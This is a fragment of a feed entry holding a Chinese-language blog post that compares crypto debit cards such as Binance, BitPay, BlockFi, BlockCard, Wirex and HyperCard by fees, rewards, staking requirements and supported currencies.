</p>\n<p>你知道世界上最大的加密货币交易所提供借记卡吗？ Binance卡早在2020年推出，支持多种加密货币的支付，如比特币（BTC）、Binance Coin（BNB）、乙太坊（ETH）和Binance USD（BUSD）。 和前面提到的Coinbase卡一样，Binance卡允许用户在钱包中持有加密货币，只在购买时兑换需要的金额。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/Zn5lYpOX8t5F2o7KHC9-I.png?height=565&width=647\" alt=\"\"></p>\n<p> </p>\n<p><strong>BitPay</strong></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/ACJQx52Y3eU3FhN7AJqmY.png?height=734&width=643\" alt=\"\"></p>\n<p> </p>\n<p>与其他卡相比，Bitpay卡支持的加密货币种类较少，而且法币只支持美元。 Bitpay卡支持实时充值，这意味着可以直接通过Bitpay app中的钱包为卡充值。 Bitpay以其为卡片提供的强化安全保障而自豪。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/vz29c1yXf8KMm0hWe_vmm.png?height=268&width=639\" alt=\"\"></p>\n<p><strong>BlockFi</strong></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/Y1qgZXwEjpmwDvz7qdSKx.png?height=758&width=637\" alt=\"\"></p>\n<p> </p>\n<p>BlockFi 卡是首批进入市场的加密货币奖励信用卡之一。 与其他一些卡不同的是，赚取的返现并不自动转换为加密货币。 相反，返现每月都会自动计入你的 BlockFi 账户中。 持卡人在一个自然年内的任何超过50,000美元的消费，都将获得2%的返现。然而，BlockFi 提供的奖金通常比其他加密货币卡少。 该卡确实提供了有竞争力的入门费率，新持卡人在前3个月的所有交易中获得3.5%的返现。</p>\n<p> </p>\n<p>注：BlockFi已与2022年11月提交了破产保护。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/RxLspP3TkiT7G44Fb5pTG.png?height=360&width=646\" alt=\"\"></p>\n<p> </p>\n<p><strong>BlockCard</strong></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/FyfS1qed_OYIxHGyMq0VI.png?height=765&width=640\" alt=\"\"></p>\n<p> </p>\n<p>Blockcard 之所以受欢迎，主要是因为其丰厚的返现奖励。 这些奖励的范围是1-6%，取决于所选择的卡的级别。 Blockcard 还为每月大量使用其卡片的使用者提供额外奖励。 需要注意的是，这些福利通常需要质押 TERN 代币，而TERN是一个相当小规模的代币，可能有严重波动的风险。 TERN 的价值下降有可能会抵消这些福利和奖励。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/D0a_ew21MFgCrCigRUpKR.png?height=490&width=642\" alt=\"\"></p>\n<p> </p>\n<p><strong>Wirex</strong></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/KWiVKI0Q914X6IAb2kwP6.png?height=761&width=638\" alt=\"\"></p>\n<p> </p>\n<p>是现存时间最长的加密货币卡之一。 该公司自2014年以来一直存在，在美国境内提供卡片。 Wirex 卡上附有一种名为 X-points 的代币，需要将其转换为加密货币。 该卡提供高达8%的返现，但并没有提供很多额外的奖励或福利。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/u8zrdgFux3VC6XC5qZOq2.png?height=496&width=651\" alt=\"\"></p>\n<p> </p>\n<h2 id=\"\"> </h2>\n<p><em>If you find submirror valuable, please consider donate to wong2.eth to help cover server cost.</em></p>\n","content:encodedSnippet":"随着加密货币的持续流行，业内公司也在努力寻求更多方法，降低人们进入加密货币世界的门槛。 方法之一是推出加密货币借记卡。\n \n在这篇文章中，我们将介绍一些在选择加密货币卡时需要考虑的问题，并向大家推荐八种优质加密货币卡片。\n \n什么是加密货币借记卡？\n \n加密货币卡的工作原理与普通借记卡相同，区别是它们与j加密货币钱包相连， 而不是与普通银行账户相连。 通过转换你钱包里的资金，加密货币卡允许你像使用传统信用卡一样在各类商家中进行消费，即使这些商家不接受加密货币。\n \n如何选择更适合的加密货币借记卡？\n \n因为需要考虑的因素众多，所以选择加密货币卡可能比较难。 需要考虑的主要因素与安全、费用、奖励以及所支持的货币种类有关。 对于大家感兴趣的卡片，一定要确保了解其所有细节，并将其与市场上的其他卡片进行比较，以选出最适合自己的卡片。\n \n安全性： 大多数卡都提供安全措施，如双因素认证，但有些则没有。 一定要查看你选择的卡是否有一些安全保障，以确保资金安全。\n \n费用： 大多数加密货币卡都有费用， 可能包括月费、国外交易费和自动取款机手续费。 尽可能找一张收费较少的卡。\n \n奖励： 很多加密货币卡提供加密货币返现作为奖励，使得用户能够受益更多。\n \n质押要求： 对于有多个会员等级的加密货币卡，为了解锁最高奖励，可能有较高的质押要求。 在研究所提供的奖励和选择等级时，也需要考虑到这一点。\n \n支持的货币种类： 一些加密货币卡只支持少数特定货币。 你应该确保你选择的卡支持你喜欢的货币。\n \n支持的国家区域： 有些卡只支援特定地区，如欧洲或美国。 请务必确定你考虑中的卡是否在你的地区可用。\n \n笔者为大家筛选了当前市场上较为热门的几个加密货币卡，并对他们的优缺点进行了点评，希望能够很高的帮助到大家。\nCrypto.com\n\n \nCrypto.com是市场上领先的加密货币应用程序之一， 提供各种各样的奖励，如每月订阅服务的报销，CRO形式的高额返现，享受机场贵宾室，等等。 听起来很吸引人，但需要注意的是，以上福利和奖励基于不同层级而变化。 选择Crypto.com卡时，由于其质押的数额要求较高，有些层级很难达到。\n \n\n \n \nHyperCard\n \n首先看一下官方提供的选购指南：\n\n \nHyperCard种类比较多，有虚拟卡也有实体卡，还有新近推出的至尊返利卡，我为大家一一列举一下：\n \n\n \nHyperCard至尊返利卡\n \nHyperCard的至尊返利卡模式与CRO卡类似，但是返利额度比CRO卡要高。\n \n这是类消费挖矿的形式，不同的锁仓额度所对应的返利额度也不同，锁仓HW5，基础消费返利比例为4%-12%，返利额度可以获得10倍增幅（8倍归属自己，2倍归属邀请人），起步锁仓额度为1000等值USDT代币，在用户申请了至尊返利卡后，并使用HyperCard进行消费的情况下，消费了100USDT，那可以获得32USDT等值HW5的返利，这32USDT的返利将在每个月15号分12笔返到用户的账户中，这是基于成功消费的前提下，如果发生了退款行为，HyperPay钱包会扣除退款部分所对应的返利，具体返利比例和需求等级如下：\n\n \n\nCoinbase\n \n\n \n由受欢迎的交易所Coinbase发行的j加密货币卡，提供每次购物时高达4%的奖励。 该借记卡与Coinbase加密货币账户相连，允许用户自动清算加密货币资产，以美元支付物品。 获得的奖励将基于你选择的币种–如果你想获得比特币的返现，比率将是1%。 如果你想获得Stella Lumens返现，则可以获得4%。 用户可以随时在这两种奖励之间切换。\n \n\n \n \nBinance\n\n \n你知道世界上最大的加密货币交易所提供借记卡吗？ Binance卡早在2020年推出，支持多种加密货币的支付，如比特币（BTC）、Binance Coin（BNB）、乙太坊（ETH）和Binance USD（BUSD）。 和前面提到的Coinbase卡一样，Binance卡允许用户在钱包中持有加密货币，只在购买时兑换需要的金额。\n \n\n \nBitPay\n \n\n \n与其他卡相比，Bitpay卡支持的加密货币种类较少，而且法币只支持美元。 Bitpay卡支持实时充值，这意味着可以直接通过Bitpay app中的钱包为卡充值。 Bitpay以其为卡片提供的强化安全保障而自豪。\n \n\nBlockFi\n \n\n \nBlockFi 卡是首批进入市场的加密货币奖励信用卡之一。 与其他一些卡不同的是，赚取的返现并不自动转换为加密货币。 相反，返现每月都会自动计入你的 BlockFi 账户中。 持卡人在一个自然年内的任何超过50,000美元的消费，都将获得2%的返现。然而，BlockFi 提供的奖金通常比其他加密货币卡少。 该卡确实提供了有竞争力的入门费率，新持卡人在前3个月的所有交易中获得3.5%的返现。\n \n注：BlockFi已与2022年11月提交了破产保护。\n \n\n \nBlockCard\n \n\n \nBlockcard 之所以受欢迎，主要是因为其丰厚的返现奖励。 这些奖励的范围是1-6%，取决于所选择的卡的级别。 Blockcard 还为每月大量使用其卡片的使用者提供额外奖励。 需要注意的是，这些福利通常需要质押 TERN 代币，而TERN是一个相当小规模的代币，可能有严重波动的风险。 TERN 的价值下降有可能会抵消这些福利和奖励。\n \n\n \nWirex\n \n\n \n是现存时间最长的加密货币卡之一。 该公司自2014年以来一直存在，在美国境内提供卡片。 Wirex 卡上附有一种名为 X-points 的代币，需要将其转换为加密货币。 该卡提供高达8%的返现，但并没有提供很多额外的奖励或福利。\n \n\n \n \nIf you find submirror valuable, please consider donate to wong2.eth to help cover server cost.","guid":"https://mirror.xyz/0xA1991C47cb9Eb325164952F931d8616672f43C29/_I6NJiGA4uUmhaHVxWDZyf_-zIgEfpJFYepZaMHeM1Y","isoDate":"2022-12-15T11:40:55.000Z","from":"https://submirror.xyz/0xA1991C47cb9Eb325164952F931d8616672f43C29","hashId":"a92d2f199162779af3180cde2fbf43ef"}]